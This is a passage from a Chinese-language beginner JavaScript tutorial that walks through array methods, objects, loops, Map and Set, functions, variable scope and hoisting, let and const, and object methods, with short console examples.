<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="number">3</span>) [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>]</span><br><span class="line">arr.reverse()</span><br><span class="line">(<span class="number">3</span>) [<span class="string">&quot;C&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;A&quot;</span>]</span><br></pre></td></tr></table></figure>
<ol start="8">
<li>concat()</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="number">3</span>) [<span class="string">&quot;C&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;A&quot;</span>]</span><br><span class="line">arr.concat([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">(<span class="number">6</span>) [<span class="string">&quot;C&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr</span><br><span class="line">(<span class="number">3</span>) [<span class="string">&quot;C&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;A&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>注意：concat()  并没有修改数组，只是会返回一个新的数组</p>
<ol start="9">
<li>连接符 join</li>
</ol>
<p>打印拼接数组，使用特定的字符串连接ei</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="number">3</span>) [<span class="string">&quot;C&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;A&quot;</span>]</span><br><span class="line">arr.join(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="string">&quot;C-B-A&quot;</span></span><br></pre></td></tr></table></figure>
<ol start="10">
<li>多维数组</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arr = [[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>],[<span class="string">&quot;5&quot;</span>,<span class="string">&quot;6&quot;</span>]]</span><br><span class="line">arr[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>


<p>数组：存储数据（如何存，如何取，方法都可以自己实现！）</p>
<h3 id="3-3-对象"><a href="#3-3-对象" class="headerlink" title="3.3 对象"></a>3.3 对象</h3><p>若按个键值对</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> 对象名 = &#123;</span><br><span class="line">    key: <span class="string">&#x27;value&#x27;</span>,</span><br><span class="line">    key: <span class="string">&#x27;value&#x27;</span>,</span><br><span class="line">    key: <span class="string">&#x27;value&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义了一个person对象，他有四个属性！</span></span><br><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name: <span class="string">&quot;john&quot;</span>,</span><br><span class="line">    age: <span class="number">3</span>,</span><br><span class="line">    email: <span class="string">&quot;1234567@qq.com&quot;</span>,</span><br><span class="line">    score: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JS中对象，{……}表示一个对象，键值对描述属性 xxxx: xxxx，多个对象之间使用逗号隔开，最后一个属性不加逗号！</p>
<p>JavaScript中的所有的键都是字符串，值是任意对象</p>
<ol>
<li>对象赋值</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person.name</span><br><span class="line"><span class="string">&quot;john&quot;</span></span><br><span class="line">person.name = <span class="string">&quot;yu&quot;</span></span><br><span class="line"><span class="string">&quot;yu&quot;</span></span><br><span class="line">person.name</span><br><span class="line"><span class="string">&quot;yu&quot;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>使用一个不存在的对象属性，不会报错！ undifined</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person.haha</span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>动态的删减属性，通过 delete 删除对象的属性</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> person.name</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">person</span><br><span class="line">&#123;<span class="attr">age</span>: <span class="number">3</span>, <span class="attr">email</span>: <span class="string">&quot;1234567@qq.com&quot;</span>, <span class="attr">score</span>: <span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>动态的添加，直接给新的属性添加值即可</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person.haha = <span class="string">&quot;haha&quot;</span></span><br><span class="line"><span class="string">&quot;haha&quot;</span></span><br><span class="line">person</span><br><span class="line">&#123;<span class="attr">age</span>: <span class="number">3</span>, <span class="attr">email</span>: <span class="string">&quot;1234567@qq.com&quot;</span>, <span class="attr">score</span>: <span class="number">0</span>, <span class="attr">haha</span>: <span class="string">&quot;haha&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>判断属性值是否在这个对象中！ xxx in xxx !</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;age&#x27;</span> <span class="keyword">in</span> person</span><br><span class="line"><span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;toString&#x27;</span> <span class="keyword">in</span> person</span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>
<ol start="6">
<li>判断一个属性是否是这个对象自身拥有的    hasOwnProperty()</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person.hasOwnProperty(<span class="string">&#x27;toString&#x27;</span>)</span><br><span class="line"><span class="literal">false</span></span><br><span class="line">person.hasOwnProperty(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>


<h3 id="3-4-流程控制"><a href="#3-4-流程控制" class="headerlink" title="3.4 流程控制"></a>3.4 流程控制</h3><p>if判断</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (age&gt;<span class="number">3</span>)&#123;</span><br><span class="line">    alert(<span class="string">&quot;haha&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (age&lt;<span class="number">5</span>)&#123;</span><br><span class="line">    alert(<span class="string">&quot;kuwa~&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    alert(<span class="string">&quot;kuwa~~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>循环，避免程序死循环</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">while</span> (age&lt;<span class="number">100</span>)&#123;</span><br><span class="line">    age++;</span><br><span class="line">    <span class="built_in">console</span>.log(age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    age++;</span><br><span class="line">    <span class="built_in">console</span>.log(age);</span><br><span class="line">&#125;<span class="keyword">while</span> (age&lt;<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<p>for循环</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">100</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>forEach循环</p>
<blockquote>
<p>5.1引入的</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>];</span><br><span class="line"><span class="comment">//函数</span></span><br><span class="line">arr.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>for…in</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//for (var index in object)&#123;&#125;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> num <span class="keyword">in</span> age)&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(age[num]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="3-5-Map和Set"><a href="#3-5-Map和Set" class="headerlink" title="3.5 Map和Set"></a>3.5 Map和Set</h3><blockquote>
<p>ES6 的新特性~</p>
</blockquote>
<p>Map：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ES6 Map</span></span><br><span class="line"><span class="comment">//学生的成绩，学生的名字</span></span><br><span class="line"><span class="comment">// var names = [&quot;Tom&quot;,&quot;Jack&quot;,&quot;Kris&quot;];</span></span><br><span class="line"><span class="comment">// var scores = [100,98,66];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="string">&#x27;Tom&#x27;</span>,<span class="number">100</span>],[<span class="string">&#x27;Jack&#x27;</span>,<span class="number">98</span>],[<span class="string">&#x27;Kris&#x27;</span>,<span class="number">66</span>]]);</span><br><span class="line"><span class="keyword">var</span> name = map.get(<span class="string">&#x27;Tom&#x27;</span>);      <span class="comment">//通过key获得value</span></span><br><span class="line">map.set(<span class="string">&#x27;admin&#x27;</span>,<span class="number">123456</span>);		<span class="comment">//新增或修改一个元素</span></span><br><span class="line">map.delete(<span class="string">&#x27;Tom&#x27;</span>);		<span class="comment">//删除一个元素</span></span><br></pre></td></tr></table></figure>
<p>Set：无序不重复的集合</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,]);  <span class="comment">//set可以去重</span></span><br><span class="line">set.add(<span class="number">2</span>);		<span class="comment">//添加</span></span><br><span class="line">set.delete(<span class="number">1</span>);		<span class="comment">//删除</span></span><br><span class="line"><span class="built_in">console</span>.log(set.has(<span class="number">3</span>));		<span class="comment">//是否包含某个元素</span></span><br></pre></td></tr></table></figure>


<h3 id="3-6-iterrator"><a href="#3-6-iterrator" class="headerlink" title="3.6 iterrator"></a>3.6 iterrator</h3><blockquote>
<p>ES6新特性</p>
</blockquote>
<p>遍历数组</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过for  of  /  for  in  下标</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">of</span> arr)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>遍历map</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>([[<span class="string">&#x27;Tom&#x27;</span>,<span class="number">100</span>],[<span class="string">&#x27;Jack&#x27;</span>,<span class="number">98</span>],[<span class="string">&#x27;Kris&#x27;</span>,<span class="number">66</span>]]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">of</span> map)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>遍历set</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> set = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>]);  <span class="comment">//set可以去重</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">of</span> set)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="4、函数"><a href="#4、函数" class="headerlink" title="4、函数"></a>4、函数</h2><h3 id="4-1-定义函数"><a href="#4-1-定义函数" class="headerlink" title="4.1 定义函数"></a>4.1 定义函数</h3><blockquote>
<p>定义方式一</p>
</blockquote>
<p>绝对值函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abs</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一旦执行到 return 代表函数结束，返回结果！</p>
<p>如果没有执行 return 函数执行完也会返回结果，结果就是 undefined</p>
<blockquote>
<p>定义方式二</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>function(x){….} 这是一个匿名函数，但是可以把结果赋值给abs，通过abs就可以调用函数！</p>
<p>方式一和方式二等价！</p>
<blockquote>
<p>调用函数</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">abs(<span class="number">10</span>)		<span class="comment">//10</span></span><br><span class="line">abs(-<span class="number">10</span>)	<span class="comment">//10</span></span><br></pre></td></tr></table></figure>
<p>参数问题：JS可以传任意个参数，也可以不传参数</p>
<p>参数进来是否存在问题？</p>
<p>假设不存在参数，如何规避？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//手动抛出异常来判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> x!= <span class="string">&#x27;number&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&#x27;Not a number&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>arugument</p>
</blockquote>
<p><code>arguments</code> 是一个JS免费赠送的关键字</p>
<p>代表，传递进来的所有参数，是一个数组</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;x=&gt;&quot;</span>+x);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="built_in">arguments</span>.length;i++)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">arguments</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> -x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问题： argument 包含所有的参数，我们有时候想使用多余的参数来进行附加操作。需要排除已有的参数~</p>
<blockquote>
<p>rest</p>
</blockquote>
<p>以前：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">arguments</span>.length&gt;<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i =<span class="number">2</span>;i&lt;<span class="built_in">arguments</span>.length;i++)&#123;</span><br><span class="line">		<span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ES6引入的新特性，获取除了已经定义的参数之外的所有参数~…</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params">a,b,...rest</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;a=&gt;&quot;</span>+a);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;b=&gt;&quot;</span>+b);</span><br><span class="line">    <span class="built_in">console</span>.log(rest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>rest 参数只能写在最后面，必须用 … 标识。</p>
<h3 id="4-2-变量作用域"><a href="#4-2-变量作用域" class="headerlink" title="4.2 变量作用域"></a>4.2 变量作用域</h3><p>在JS中, var 定义变量实际是有作用域得。</p>
<p>假设在函数体中声明，则在函数体外不可以使用~ （非要想实现得话，后面可以研究<code>闭包</code>）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">x = x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">x = x + <span class="number">2</span>;      <span class="comment">//Uncaught ReferenceError: x is not defined</span></span><br></pre></td></tr></table></figure>
<p>如果两个函数使用了相同得变量名，只要在函数内部，就不冲突</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">    x = x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qj2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    x = x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>内部函数可以访问外部函数的成员，反之则不行</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//内部函数可以访问外部函数得成员，反之则不行</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">qj2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> y = x + <span class="number">1</span>;      <span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> z = y + <span class="number">1</span>;      <span class="comment">//报错：Uncaught ReferenceError: y is not defined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设，颞部函数变量和外部函数变量重名！</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//内部函数可以访问外部函数得成员，反之则不行</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">qj2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> x = <span class="string">&#x27;A&#x27;</span>;      <span class="comment">//2</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;inner&#x27;</span>+x);     <span class="comment">//innerA</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;outer&#x27;</span>+x);     <span class="comment">//outer1</span></span><br><span class="line">    qj2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设JS中函数查找变量从自身函数开始~，由”内“向”外“查找，假设外部存在这个同名得函数变量，则内部函数回屏蔽外部函数变量。</p>
<blockquote>
<p>提升变量的作用域</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&#x27;x&#x27;</span> + y;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">    <span class="keyword">var</span> y = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：xundefined</p>
<p>说明：JS执行引擎，自动提升了 y 的声明，但是不会提升变量 y 的赋值；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qj2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> y;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&#x27;x&#x27;</span> + y;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">     y = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个是在JS建立之初就存在的特性。养成规范：所有的变量定义都放在函数的头部，不要乱放，便于代码维护；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qj2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">1</span>,</span><br><span class="line">        y = x + <span class="number">1</span>,</span><br><span class="line">        z,i,a;      <span class="comment">//undefuned</span></span><br><span class="line">    <span class="comment">//之后随意用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>全局函数</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局变量</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br><span class="line"><span class="built_in">console</span>.log(x);</span><br></pre></td></tr></table></figure>
<p>全局对象 window </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">alert(x);</span><br><span class="line">alert(<span class="built_in">window</span>.x);    <span class="comment">//默认所有的全局变量，都会自动绑定在 window 对象下；</span></span><br></pre></td></tr></table></figure>
<p>alert() 函数本身也是一个 <code>window</code> 变量</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"><span class="built_in">window</span>.alert(x);</span><br><span class="line"><span class="keyword">var</span> old_alert = <span class="built_in">window</span>.alert;</span><br><span class="line"><span class="comment">//old_alert(x);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//发现alert()失效了</span></span><br><span class="line"><span class="built_in">window</span>.alert(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//恢复</span></span><br><span class="line"><span class="built_in">window</span>.alert = old_alert;</span><br><span class="line"><span class="built_in">window</span>.alert(<span class="string">&#x27;456&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>JS实际上只有一个全局作用域，任何变量函数（函数也可以视为变量），假设没有函数在函数作用范围内找到，就会向外查找，如果在全局作用域都没有找到，报错 <code>ReferencErro</code></p>
<blockquote>
<p>规范</p>
</blockquote>
<p>由于我们所有的全局变量都会绑定到我们的 window 上。如果不同的JS文件，使用了相同的全局变量，冲突~&gt;如何能够减少冲突？</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//唯一全局变量</span></span><br><span class="line"><span class="keyword">var</span> JohnApp = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义全局变量</span></span><br><span class="line">JohnApp.name = <span class="string">&#x27;John&#x27;</span>;</span><br><span class="line">JohnApp.add = <span class="function"><span class="keyword">function</span> (<span class="params">a,b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>把自己的代码全局放入自己定义的唯一空间名字中，降低全局命名冲突的问题。</p>
<p>JQuery</p>
<blockquote>
<p>局部作用域 let</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(i+<span class="number">1</span>); <span class="comment">//i 出了这个作用域还可以使用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ES6 let关键字，解决局部作用域冲突的问题</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(i+<span class="number">1</span>); <span class="comment">//Uncaught ReferenceError: i is not defined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>建议大家都使用 <code>let</code> 取定义局部作用域的变量；</p>
<blockquote>
<p>常量 const</p>
</blockquote>
<p>在ES6之前，怎么定义常量：只有用全部大写字母命名的变量就是常量；建议不要修改这样的值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> PI = <span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">console</span>.log(PI);</span><br><span class="line"></span><br><span class="line">PI = <span class="number">321</span>;   <span class="comment">//可以改变这个值</span></span><br><span class="line"><span class="built_in">console</span>.log(PI);</span><br></pre></td></tr></table></figure>
<p>在ES6引入了常量关键字 <code>const</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PI = <span class="number">3.14</span>;    <span class="comment">//只读变量</span></span><br><span class="line"><span class="built_in">console</span>.log(PI);</span><br><span class="line"></span><br><span class="line">PI = <span class="number">321</span>;   <span class="comment">//Uncaught TypeError: Assignment to constant variable.</span></span><br><span class="line"><span class="built_in">console</span>.log(PI);</span><br></pre></td></tr></table></figure>


<h3 id="4-3-方法"><a href="#4-3-方法" class="headerlink" title="4.3  方法"></a>4.3  方法</h3><blockquote>
<p>定义方法</p>
</blockquote>
<p>方法就是把函数放在对象里面，对象只有两个东西：属性和方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> john = &#123;</span><br><span class="line">    name: <span class="string">&#x27;yu&#x27;</span>,</span><br><span class="line">    birth: <span class="number">2020</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">//方法</span></span><br><span class="line">    age: <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//今年 - 出生的年</span></span><br><span class="line">        <span class="keyword">var</span> now = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">        <span class="keyword">return</span> now - <span class="built_in">this</span>.birth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//属性</span></span><br><span class="line">john.name</span><br><span class="line"><span class="comment">//方法,一定要带()</span></span><br><span class="line">john,age()</span><br></pre></td></tr></table></figure>
<p>this. 代表什么？</p>
